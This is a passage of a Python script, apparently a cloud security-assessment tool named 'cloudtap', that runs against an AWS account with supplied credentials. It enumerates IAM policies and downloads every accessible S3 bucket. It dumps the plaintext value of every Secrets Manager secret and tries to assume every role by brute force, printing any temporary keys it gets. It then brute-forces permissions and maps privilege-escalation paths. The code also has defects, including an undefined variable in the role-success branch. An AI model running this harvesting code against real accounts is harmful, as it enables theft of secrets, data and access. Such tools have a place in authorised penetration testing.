            attached_group_policies = iam_client.list_attached_group_policies(GroupName=group_name)
            for policy in attached_group_policies.get("AttachedPolicies", []):
                print(f"   {Fore.CYAN}Attached Managed Policy: {policy['PolicyName']} "
                    f"(ARN: {policy['PolicyArn']}){Style.RESET_ALL}")

                # ▸ Fetch default version & document
                policy_detail  = iam_client.get_policy(PolicyArn=policy["PolicyArn"])
                version_id     = policy_detail["Policy"]["DefaultVersionId"]
                policy_version = iam_client.get_policy_version(
                    PolicyArn=policy["PolicyArn"], VersionId=version_id
                )

                print(f"     {Fore.BLUE}Permissions for {policy['PolicyName']} "
                    f"(Default Version {version_id}):{Style.RESET_ALL}")
                print_policy_document(policy_version["PolicyVersion"]["Document"])
                extract_permissions_from_policy(policy_version["PolicyVersion"]["Document"])

                # ▸ Stash the full document for JSON
                group_policy_details.append({
                    "name":            policy["PolicyName"],
                    "arn":             policy["PolicyArn"],
                    "default_version": version_id,
                    "document":        policy_version["PolicyVersion"]["Document"],
                })

                # Optional: list **all** versions (unchanged code)
                list_versions = input(
                    f"\n{Fore.CYAN}Do you want to list all versions of group policy "
                    f"'{policy['PolicyName']}'? (y/N): {Style.RESET_ALL}"
                ).strip().lower()
                if list_versions in ("y", "yes"):
                    try:
                        policy_versions = iam_client.list_policy_versions(PolicyArn=policy["PolicyArn"])
                        print(f"\n     {Fore.YELLOW}All versions of {policy['PolicyName']}:{Style.RESET_ALL}")
                        for version in policy_versions.get("Versions", []):
                            v_id       = version["VersionId"]
                            is_default = version["IsDefaultVersion"]
                            status     = "DEFAULT" if is_default else "NON-DEFAULT"
                            created    = version["CreateDate"].strftime("%Y-%m-%d %H:%M:%S")
                            print(f"       {Fore.CYAN}Version {v_id} ({status}) - Created: {created}{Style.RESET_ALL}")

                            v_doc = iam_client.get_policy_version(
                                PolicyArn=policy["PolicyArn"], VersionId=v_id
                            )["PolicyVersion"]["Document"]
                            import json
                            indented = json.dumps(v_doc, indent=4).splitlines()
                            for line in indented:
                                print("         " + line)
                            print()
                    except Exception as e:
                        print(f"       {Fore.RED}Error listing versions for {policy['PolicyName']}: {e}{Style.RESET_ALL}")
                        logger.error(f"Error listing policy versions: {e}")

            # ──────────────────────────────────────────────────────
            # 2) Inline group policies
            # ──────────────────────────────────────────────────────
            inline_group_policies = iam_client.list_group_policies(GroupName=group_name)
            for policy_name in inline_group_policies.get("PolicyNames", []):
                print(f"   {Fore.CYAN}Inline Policy: {policy_name}{Style.RESET_ALL}")
                policy_doc = iam_client.get_group_policy(
                    GroupName=group_name, PolicyName=policy_name
                )
                print(f"     {Fore.BLUE}Permissions:{Style.RESET_ALL}")
                print_policy_document(policy_doc["PolicyDocument"])
                extract_permissions_from_policy(policy_doc["PolicyDocument"])

                # ▸ Save full doc
                group_inline_policy_details.append({
                    "name":     policy_name,
                    "document": policy_doc["PolicyDocument"],
                })

            # ──────────────────────────────────────────────────────
            # 3) Push one consolidated entry for this group
            # ──────────────────────────────────────────────────────
            group_entries.append({
                "name":             group_name,
                "arn":              group["Arn"],
                "attached_policies": group_policy_details,
                "inline_policies":   group_inline_policy_details,
            })


        # Store summary for JSON output
        user_entry = {
            "username":          username,
            "attached_policies": attached_policy_details,
            "inline_policies":   inline_policy_details,
            "groups":            group_entries
        }
        output_data["iam"]["users"].append(user_entry)

    except Exception as e:
        error_msg = f"Error fetching IAM details for {username}: {e}"
        logger.error(error_msg)
        print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")

elif session_token:
    print(f"\n{Fore.YELLOW}=== Role-based Permissions (Session Token) ==={Style.RESET_ALL}")
    print(f"{Fore.CYAN}📋 Currently using temporary credentials from an assumed role.{Style.RESET_ALL}")
    print(f"{Fore.BLUE}ℹ️  IAM user policy enumeration skipped (not applicable for assumed roles).{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}🔍 The permissions are defined by the assumed role's policies.{Style.RESET_ALL}")
    logger.info("Skipping IAM user analysis - using assumed role credentials")

# S3 Bucket Discovery and Download
print(f"\n{Fore.YELLOW}=== S3 Bucket Analysis ==={Style.RESET_ALL}")
logger.info("Starting S3 bucket analysis")

# Create main download directory
Path("s3_downloads").mkdir(exist_ok=True)

if bucket:
    # Download specific bucket
    logger.info(f"Processing specific bucket: {bucket}")
    list_and_download_bucket(s3_client, bucket)
else:
    # List all accessible buckets and download from each
    try:
        print(f"{Fore.BLUE}Discovering accessible S3 buckets...{Style.RESET_ALL}")
        buckets_response = s3_client.list_buckets()
        buckets = buckets_response.get('Buckets', [])
        
        print(f"{Fore.GREEN}Found {len(buckets)} accessible buckets:{Style.RESET_ALL}")
        logger.info(f"Found {len(buckets)} accessible buckets")
        
        for i, bucket_info in enumerate(buckets, 1):
            bucket_name = bucket_info['Name']
            creation_date = bucket_info['CreationDate']
            print(f"{Fore.CYAN}{i}. {bucket_name} {Fore.YELLOW}(Created: {creation_date}){Style.RESET_ALL}")
        
        if buckets:
            print(f"\n{Fore.MAGENTA}Proceeding to download from all {len(buckets)} buckets...{Style.RESET_ALL}")
            
            # Process each bucket with overall progress
            with tqdm(total=len(buckets), desc="Processing buckets", unit="bucket", colour="blue") as bucket_pbar:
                for bucket_info in buckets:
                    bucket_name = bucket_info['Name']
                    bucket_pbar.set_description(f"Processing {bucket_name}")
                    list_and_download_bucket(s3_client, bucket_name)
                    bucket_pbar.update(1)
        else:
            print(f"{Fore.YELLOW}No accessible buckets found.{Style.RESET_ALL}")
            logger.info("No accessible buckets found")
            
    except Exception as e:
        error_msg = f"Error listing buckets: {e}"
        logger.error(error_msg)
        print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")

# List secrets
print(f"\n{Fore.YELLOW}=== Secrets Manager Analysis ==={Style.RESET_ALL}")
logger.info("Starting Secrets Manager analysis")

try:
    secrets_list = secrets_client.list_secrets()
    print(f"{Fore.CYAN}Secrets List:{Style.RESET_ALL}")
    print(f"{Fore.BLUE}{json.dumps(secrets_list, indent=4, sort_keys=True, default=custom_serializer)}{Style.RESET_ALL}")
    
    secret_count = len(secrets_list.get("SecretList", []))
    logger.info(f"Found {secret_count} secrets")
    
    if secret_count > 0:
        with tqdm(total=secret_count, desc="Retrieving secrets", unit="secret", colour="red") as secrets_pbar:
            for secret in secrets_list.get("SecretList", []):
                name = secret.get("Name")
                if name:
                    secrets_pbar.set_description(f"Retrieving {name[:30]}...")
                    try:
                        secret_dump = secrets_client.get_secret_value(SecretId=name)
                        print(f"\n{Fore.GREEN}Secret: {name}{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}{json.dumps(secret_dump, indent=4, sort_keys=True, default=custom_serializer)}{Style.RESET_ALL}")
                        logger.info(f"Successfully retrieved secret: {name}")
                        output_data["secrets_manager"]["secrets"].append({"name": name, "value": secret_dump.get("SecretString")})
                    except Exception as e:
                        error_msg = f"Error retrieving secret '{name}': {e}"
                        logger.error(error_msg)
                        print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")
                    
                    secrets_pbar.update(1)
    else:
        print(f"{Fore.YELLOW}No secrets found.{Style.RESET_ALL}")
        
except Exception as e:
    error_msg = f"Error listing secrets: {e}"
    logger.error(error_msg)
    print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")

print(f"\n{Fore.YELLOW}=== Optional Analysis Options ==={Style.RESET_ALL}")
print(f"{Fore.CYAN}1. Analyze Lambda Functions{Style.RESET_ALL}")
print(f"{Fore.CYAN}2. Analyze SNS Topics{Style.RESET_ALL}") 
print(f"{Fore.CYAN}3. List All SNS Subscriptions{Style.RESET_ALL}")
print(f"{Fore.CYAN}4. Analyze Beanstalk Environments{Style.RESET_ALL}")
print(f"{Fore.CYAN}5. Analyze EC2 and EBS{Style.RESET_ALL}")
print(f"{Fore.CYAN}6. Analyze ECS{Style.RESET_ALL}")
print(f"{Fore.RED}7. Run Full Scan{Style.RESET_ALL}")
print(f"{Fore.CYAN}Press Enter to skip optional analyses{Style.RESET_ALL}")

choice = input(f"{Fore.GREEN}Enter your choice (1-7) or press Enter to continue: {Style.RESET_ALL}").strip()

if choice == "1":
    analyze_lambda_functions(session, region)
elif choice == "2":
    analyze_sns_topics(session, region)
elif choice == "3":
    list_all_sns_subscriptions(session, region)
elif choice == "4":
    analyze_beanstalk_environments(session, region)
elif choice == "5":
    analyze_ec2_instances(session, region)
elif choice == "6":
    analyze_ecs_clusters(session, region)
elif choice == "7":
    analyze_lambda_functions(session, region)
    analyze_sns_topics(session, region)
    list_all_sns_subscriptions(session, region)
    analyze_beanstalk_environments(session, region)
    analyze_ec2_instances(session, region)
    analyze_ecs_clusters(session, region)
elif choice == "":
    print(f"{Fore.BLUE}Skipping optional analyses...{Style.RESET_ALL}")
else:
    print(f"{Fore.YELLOW}Invalid choice, continuing with main flow...{Style.RESET_ALL}")

# Program ALWAYS continues here regardless of choice above
print(f"\n{Fore.BLUE}Continuing with main security assessment...{Style.RESET_ALL}")


# Role discovery and assumption (only for permanent credentials to avoid confusion)
if not session_token:
    print(f"\n{Fore.YELLOW}=== Role Assumption Analysis ==={Style.RESET_ALL}")
    logger.info("Starting role assumption analysis")

    try:
        marker = None
        matching_roles = []
        attempted_roles = []
        successful_roles = []
        all_roles = []
        
        # First, collect all roles
        print(f"{Fore.BLUE}Collecting all IAM roles...{Style.RESET_ALL}")
        while True:
            roles_response = iam_client.list_roles(Marker=marker) if marker else iam_client.list_roles()
            batch_roles = roles_response["Roles"]
            
            # Filter out service-linked roles
            filtered_batch = [role for role in batch_roles if not is_service_linked_role(role)]
            all_roles.extend(filtered_batch)
            
            if roles_response.get("IsTruncated"):
                marker = roles_response["Marker"]
            else:
                break
        
        total_roles = len(all_roles)
        logger.info(f"Found {total_roles} user-assumable roles (filtered out service-linked roles)")
        print(f"{Fore.GREEN}Found {total_roles} user-assumable roles (service-linked roles filtered out){Style.RESET_ALL}")
        
        # Strategy 1: Check trust policies for potential matches
        print(f"\n{Fore.BLUE}Strategy 1: Analyzing trust policies...{Style.RESET_ALL}")
        with tqdm(total=len(all_roles), desc="Analyzing trust policies", unit="role", colour="yellow") as roles_pbar:
            for role in all_roles:
                role_name = role["RoleName"]
                role_arn = role["Arn"]
                trust_policy = role["AssumeRolePolicyDocument"]
                trust_policy_json = json.dumps(trust_policy)
                
                roles_pbar.set_description(f"Analyzing {role_name[:30]}...")
                
                # Check multiple conditions for potential assumability
                potentially_assumable = False
                reason = []
                
                if username and username in trust_policy_json:
                    potentially_assumable = True
                    reason.append(f"username '{username}' found in trust policy")
                
                if sts_caller_info and sts_caller_info['Arn'] in trust_policy_json:
                    potentially_assumable = True
                    reason.append(f"user ARN found in trust policy")
                
                if sts_caller_info and sts_caller_info['Account'] in trust_policy_json:
                    potentially_assumable = True
                    reason.append(f"account ID found in trust policy")
                
                # Check for wildcard or broad permissions
                if '"AWS": "*"' in trust_policy_json or '"Principal": "*"' in trust_policy_json:
                    potentially_assumable = True
                    reason.append("wildcard principal found")
                
                if potentially_assumable:
                    print(f"\n{Fore.MAGENTA}🎯 Role '{role_name}' potentially assumable:{Style.RESET_ALL}")
                    print(f" {Fore.CYAN}- Role ARN: {role_arn}{Style.RESET_ALL}")
                    print(f" {Fore.GREEN}- Reason: {', '.join(reason)}{Style.RESET_ALL}")
                    print(f" {Fore.BLUE}- Trust Policy:{Style.RESET_ALL}")
                    print_policy_document(trust_policy)
                    matching_roles.append(role_name)
                    logger.info(f"Found potentially assumable role: {role_name} - {', '.join(reason)}")
                
                roles_pbar.update(1)
        
        # Strategy 2: Brute force attempt all roles (based on user permissions)
        print(f"\n{Fore.BLUE}Strategy 2: Brute force role assumption attempts...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Attempting to assume all roles (user has sts:AssumeRole permissions)...{Style.RESET_ALL}")

        with tqdm(total=len(all_roles), desc="Attempting role assumption", unit="role", colour="red") as attempt_pbar:
            for role in all_roles:
                role_name = role["RoleName"]
                role_arn = role["Arn"]
                
                attempt_pbar.set_description(f"Trying {role_name[:25]}...")
                attempted_roles.append(role_name)
                
                # FIRST: Always analyze the role's permissions before attempting assumption
                print(f"\n{Fore.BLUE}  🔍 Analyzing role '{role_name}'...{Style.RESET_ALL}")
                role_permissions = analyze_role_permissions(iam_client, role_name)
                
                # Show role permissions for all roles
                print(f" {Fore.MAGENTA}📋 Role '{role_name}' has {len(set(role_permissions))} unique permissions{Style.RESET_ALL}")
                if role_permissions:
                    print(f" {Fore.CYAN}  Permissions: {', '.join(sorted(set(role_permissions)))}{Style.RESET_ALL}")
                else:
                    print(f" {Fore.YELLOW}  No inline policies found (may have AWS managed policies){Style.RESET_ALL}")
                
                # Show trust policy for all roles
                trust_policy = role["AssumeRolePolicyDocument"]
                print(f" {Fore.BLUE}📜 Trust Policy:{Style.RESET_ALL}")
                print_policy_document(trust_policy)
                
                # Try to assume every role
                try:
                    session_name = f"SecurityTest-{username if username else 'Unknown'}-{role_name[:20]}"
                    print(f"    {Fore.YELLOW}🎲 Attempting to assume role...{Style.RESET_ALL}")
                    
                    assume_response = sts_client.assume_role(
                        RoleArn=role_arn,
                        RoleSessionName=session_name
                    )
                    
                    # Success!
                    print(f"\n{Fore.GREEN}🎉 SUCCESS: Assumed role '{role_name}'!{Style.RESET_ALL}")
                    print(f" {Fore.CYAN}- Role ARN: {role_arn}{Style.RESET_ALL}")
                    
                    credentials = assume_response["Credentials"]
                    print(f" {Fore.YELLOW}📋 Temporary session credentials:{Style.RESET_ALL}")
                    print(f" {Fore.CYAN}  - AccessKeyId: {credentials['AccessKeyId']}{Style.RESET_ALL}")
                    print(f" {Fore.CYAN}  - SecretAccessKey: {credentials['SecretAccessKey']}{Style.RESET_ALL}")
                    print(f" {Fore.CYAN}  - SessionToken: {credentials['SessionToken']}{Style.RESET_ALL}")
                    print(f" {Fore.CYAN}  - Expiration: {credentials['Expiration']}{Style.RESET_ALL}")
                    
                    successful_roles.append({
                        "role_name":   role_name,
                        "role_arn":    role_arn,
                        "credentials": credentials,
                        **role_details
                    })

                    # persist every role’s details (whether we could assume it or not)
                    output_data.setdefault("roles", {}).setdefault("details", {})[role_name] = {
                        "arn": role_arn,
                        **role_details
                    }
                    
                    logger.success(f"Successfully assumed role: {role_name}")
                    
                except Exception as assume_error:
                    # Show failure but we already displayed the permissions above
                    print(f" {Fore.RED}❌ Failed to assume role: {assume_error}{Style.RESET_ALL}")
                    logger.debug(f"Could not assume role '{role_name}': {assume_error}")
                
                print(f" {Fore.BLUE}{'='*60}{Style.RESET_ALL}")  # Separator between roles
                attempt_pbar.update(1)

        if successful_roles:
            print(f"\n{Fore.GREEN}🎯 Successfully assumed roles summary:{Style.RESET_ALL}")
            for role_info in successful_roles:
                print(f" {Fore.GREEN}✅ {role_info['role_name']} ({role_info['role_arn']}){Style.RESET_ALL}")
            logger.success(f"Successfully assumed {len(successful_roles)} roles")
        else:
            print(f"{Fore.YELLOW}No roles could be assumed.{Style.RESET_ALL}")
            logger.info("No roles could be assumed")
            
            if matching_roles:
                print(f"{Fore.YELLOW}However, {len(matching_roles)} roles had matching trust policies:${Style.RESET_ALL}")
                for role_name in matching_roles:
                    print(f" {Fore.YELLOW}• {role_name}{Style.RESET_ALL}")

        # ─── Persist role-assumption results ────────────────────
        output_data.setdefault("roles", {})
        output_data["roles"]["all"] = [
            {"role_name": role["RoleName"], "role_arn": role["Arn"]}
            for role in all_roles
        ]
        output_data["roles"]["matching"]   = matching_roles          # trust-policy matches
        output_data["roles"]["attempted"]  = attempted_roles          # brute-force attempts
        output_data["roles"]["successful"] = successful_roles         # succeeded (with creds, perms)

        print(f"\n{Fore.BLUE}ℹ️  Note: AWS service-linked roles (AWSServiceRoleFor*, /aws-service-role/, etc.) were filtered out{Style.RESET_ALL}")
        print(f"{Fore.CYAN}   These roles are managed by AWS services and cannot be assumed by users.{Style.RESET_ALL}")
    except Exception as e:
            error_msg = f"Error while listing/analyzing roles: {e}"
            logger.error(error_msg)
            print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")

else:
    print(f"\n{Fore.YELLOW}=== Role Assumption Analysis ==={Style.RESET_ALL}")
    print(f"{Fore.CYAN}📋 Role assumption analysis skipped - already using assumed role credentials.{Style.RESET_ALL}")
    print(f"{Fore.BLUE}ℹ️  To analyze role assumptions, run this tool with permanent IAM user credentials.{Style.RESET_ALL}")
    logger.info("Skipping role assumption analysis - already using assumed role credentials")

#Bruteforce permissions
ask_to_bruteforce(session)

# Analyze permissions
results = analyzer.analyze_permissions(permissions)
output_data["permissions"]["enumerated"] = permissions
output_data["permissions"]["bruteforced"] = bruteforced_permissions
output_data["privilege_escalation"]["paths"] = results
    
# Print results
analyzer.print_results(results)

# Final Summary
print(f"\n{Fore.GREEN}{Back.BLACK}")
print("=" * 60)
print("                    ASSESSMENT COMPLETE")
print("=" * 60)
print(f"{Style.RESET_ALL}")

print(f"{Fore.GREEN}✅ AWS Security Assessment Complete{Style.RESET_ALL}")
print(f"{Fore.CYAN}📁 S3 downloads saved to: ./s3_downloads/{Style.RESET_ALL}")
print(f"{Fore.MAGENTA}📋 Detailed log saved to: aws_security_assessment.log{Style.RESET_ALL}")
print(f"{Fore.YELLOW}🔍 Check the output above for IAM permissions, secrets, and role analysis{Style.RESET_ALL}")

# If an old output exists, archive it
if os.path.isfile("cloudtap_output.json"):
    try:
        with open("cloudtap_output.json", 'r') as f:
            existing = json.load(f)
        metadata = existing.get('metadata', {})
        profile = metadata.get('profile', 'unknown')
        timestamp = metadata.get('timestamp', '')

        # Sanitize timestamp for filename
        safe_ts = timestamp.replace(':', '-').replace('T', '_').replace('Z', '')
        new_name = f"{profile}_{safe_ts}.json"

        os.makedirs("old-scans", exist_ok=True)
        dest_path = os.path.join("old-scans", new_name)
        shutil.move("cloudtap_output.json", dest_path)

        print(f"{Fore.YELLOW}🗄 Archived existing output as {dest_path}{Style.RESET_ALL}")
        logger.info(f"Archived old output to {dest_path}")
    except Exception as e:
        logger.error(f"Failed to archive existing output: {e}")

# Save new output
try:
    with open("cloudtap_output.json", 'w') as f:
        json.dump(output_data, f, indent=2)
    print(f"{Fore.GREEN}📄 Results written to cloudtap_output.json{Style.RESET_ALL}")
    logger.info("Results saved to cloudtap_output.json")
except Exception as e:
    logger.error(f"Failed to write output JSON: {e}")

# Final success log
logger.info("AWS Security Assessment completed successfully")

# Prompt to launch the web viewer
print(f"\n{Fore.GREEN}{Back.BLACK}")
print("=" * 60)
print("                    Cloud Analysis")
print("=" * 60)
response = input("\nWould you like to launch the web viewer now? [y/N]: ")
if response.strip().lower() in ('y', 'yes'):
    try:
        subprocess.run(['python', 'web_viewer.py'], check=True)
        logger.info("web_viewer.py executed successfully")
    except subprocess.CalledProcessError as e:
        logger.error(f"Error running web_viewer.py: {e}")
    except KeyboardInterrupt:
        print("\nViewer closed by user")
else:
    logger.info("Skipping web viewer launch")

